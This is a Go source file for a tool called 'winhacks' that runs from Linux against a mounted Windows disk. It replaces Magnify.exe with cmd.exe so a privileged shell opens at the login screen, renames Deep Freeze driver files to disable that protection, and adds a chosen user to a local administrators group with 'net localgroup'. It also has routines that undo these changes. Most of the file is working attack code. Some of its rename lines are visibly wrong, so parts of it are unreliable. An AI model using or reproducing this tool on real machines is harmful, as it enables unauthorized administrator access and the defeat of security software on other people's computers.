/*
winhacks --- some tools for give you power on windows from linux
Copyright (C) 2016  Lucca Prado a.k.a chloe risk

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

*/
package main

import (
	"fmt"
	"os"
	"os/exec"
)

func main() {
	fmt.Println("winhacks --- some tools for give you power on windows from linux")
	fmt.Println("Created By Lucca Prado a.k.a Chloe ")
	option := ""
	optiontwo := ""
	if len(os.Args) > 1 && len(os.Args) < 3 {
		option = os.Args[1]
		if option == "--help" {
			fmt.Println("your options:")
			fmt.Println("--help = shows this screen")
			fmt.Println("--admin = try the admin hack")
			fmt.Println("--normaluser = try to reverse operation admin hack")
			fmt.Println("--deepthaw = try to thaw deepfreeze")
			fmt.Println("--normalfreeze = try to reverse operation deepthaw")
			fmt.Println("--adminuser = add specified user to admin")
		} else if option == "--admin" {
			admin()
		} else if option == "--normaluser" {
			normaluser()
		} else if option == "--deepthaw" {
			deepthaw()
		} else if option == "--normalfreeze" {
			normalfreeze()
		} else if option == "--adminuser" { //used only on windows build
			adminuser()
		} else {
			fmt.Println("you don't entered an valid option, use --help to see options")
			os.Exit(0)
		}
	} else if len(os.Args) > 2 && len(os.Args) < 4 {
		option = os.Args[1]
		optiontwo = os.Args[2]
		fmt.Println("you choose option", option, optiontwo) // For debug
	} else {
		option = ""
		fmt.Println("you don't entered an valid option, use --help to see options")
		os.Exit(0)
	}
}

func admin() {
	winlocation := ""
	right := ""
	fmt.Print("\033[H\033[2J")
	fmt.Println("you chose the admin function, lets start :3")
	fmt.Println("first, where is your windows mounted(with ending slash too):  ")
	fmt.Scanln(&winlocation)
	fmt.Println("ok, windows location is", winlocation)
	winlocationsys := winlocation + "Windows/System32/"
	fmt.Println("so, system32 is on", winlocationsys, "Right?(Y/N)")
	fmt.Scanln(&right)
	if right == "Y" || right == "y" {
		fmt.Println("ok, let's do this")
		os.Rename(winlocationsys+"Magnify.exe", winlocationsys+"Magnify.old")
		os.Rename(winlocationsys+"cmd.exe", winlocationsys+"Magnify.exe")

		fmt.Println("all done, now you can start magnify hack on reboot")
	} else {
		admin()
	}
}
func normaluser() {
	winlocation := ""
	right := ""
	fmt.Print("\033[H\033[2J")
	fmt.Println("you chose the admin function, lets start :3")
	fmt.Println("first, where is your windows mounted(with ending slash too):  ")
	fmt.Scanln(&winlocation)
	fmt.Println("ok, windows location is", winlocation)
	winlocationsys := winlocation + "Windows/System32/"
	fmt.Println("so, system32 is on", winlocationsys, "Right?(Y/N)")
	fmt.Scanln(&right)
	if right == "Y" || right == "y" {
		fmt.Println("ok, let's do this")
		os.Rename(winlocationsys+"Magnify.exe", winlocationsys+"cmd.exe")
		os.Rename(winlocationsys+"Magnify.old", winlocationsys+"Magnify.exe")
		fmt.Println("all done, now you are with your computer normal again")
	}
}
func deepthaw() {
	fmt.Print("\033[H\033[2J")
	winlocation := ""
	right := ""
	fmt.Print("\033[H\033[2J")
	fmt.Println("you chose the deepthaw function, lets start :3")
	fmt.Println("first, where is your windows mounted(with ending slash too):  ")
	fmt.Scanln(&winlocation)
	fmt.Println("ok, windows location is", winlocation)
	winlocationsys := winlocation + "Windows/System32/"
	fmt.Println("so, system32 is on", winlocationsys, "Right?(Y/N)")
	fmt.Scanln(&right)
	if right == "Y" || right == "y" {
		fmt.Println("ok, let's do this")
		os.Rename(winlocationsys+"\\drivers\\DeepFrz.sys", winlocationsys+"\\drivers\\DeepFrz.sys.chloe")
		os.Rename(winlocationsys+"\\drivers\\DFFilter.sys", winlocationsys+"\\drivers\\DFFilter.sys.chloe")
		os.Rename(winlocationsys+"\\drivers\\DfDiskLo.sys", winlocationsys+"\\drivers\\DfDiskLo.sys.chloe")
		os.Rename(winlocationsys+"\\drivers\\FarDisk.sys", winlocationsys+"\\drivers\\FarDisk.sys.chloe")
		os.Rename(winlocationsys+"\\drivers\\DfDiskLo.sys", winlocationsys+"\\drivers\\FarSpace.sys.chloe")
		fmt.Println("all done, now you can use windows as thawed, just reboot")
	}
}
func normalfreeze() {
	fmt.Print("\033[H\033[2J")
	winlocation := ""
	right := ""
	fmt.Print("\033[H\033[2J")
	fmt.Println("you chose the deepfreeze function, lets start :3")
	fmt.Println("first, where is your windows mounted(with ending slash too):  ")
	fmt.Scanln(&winlocation)
	fmt.Println("ok, windows location is", winlocation)
	winlocationsys := winlocation + "Windows/System32/"
	fmt.Println("so, system32 is on", winlocationsys, "Right?(Y/N)")
	fmt.Scanln(&right)
	if right == "Y" || right == "y" {
		fmt.Println("ok, let's do this")
		os.Rename(winlocationsys+"\\drivers\\DeepFrz.sys.chloe", winlocationsys+"\\drivers\\DeepFrz.sys")
		os.Rename(winlocationsys+"\\drivers\\DFFilter.sys.chloe", winlocationsys+"\\drivers\\DFFilter.sys")
		os.Rename(winlocationsys+"\\drivers\\DfDiskLo.sys.chloe", winlocationsys+"\\drivers\\DfDiskLo.sys")
		os.Rename(winlocationsys+"\\drivers\\FarDisk.sys.chloe", winlocationsys+"\\drivers\\FarDisk.sys")
		os.Rename(winlocationsys+"\\drivers\\DfDiskLo.sys.chloe", winlocationsys+"\\drivers\\FarSpace.sys")
		fmt.Println("all done, now you are with your computer normal again")
	}
}
func adminuser() {
	admin := ""
	user := ""
	fmt.Println("please, insert the admin (or other) localgroup name")
	fmt.Scanln(&admin)
	fmt.Println("please, insert the username")
	fmt.Scanln(&user)
	c := exec.Command("net", "localgroup", admin, user, "/add")
	c.Run()

}
